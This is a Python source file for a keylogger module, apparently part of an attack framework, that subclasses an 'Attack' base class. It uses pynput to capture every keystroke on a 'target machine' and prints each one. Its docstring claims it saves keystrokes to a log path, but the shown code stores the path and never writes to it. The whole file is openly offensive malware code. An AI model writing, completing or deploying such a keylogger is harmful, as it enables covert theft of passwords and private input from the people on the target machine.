from .attack import Attack
from pynput.keyboard import Listener
from rich import print
    
class KeyLogger(Attack):

    def __init__(self, 
                 log_path: str):
        """This module logs all keystrokes on the target machine.

        Args:
            log_path (str): Path to save the log file.
        """
        super().__init__("Keylogger Attack", 
                         "This module logs all keystrokes on the target machine.")
        self.log_path = log_path
        self.listener = Listener(on_press=self.on_press)


    def execute(self):
        self.running = True
        self.listener.start()
        # self.listener.join()
    
    def on_press(self, key):
        # handle the key press event
        print(f"[bold green]Key pressed: {key}")

    def stop(self):
        self.running = False
        self.listener.stop()
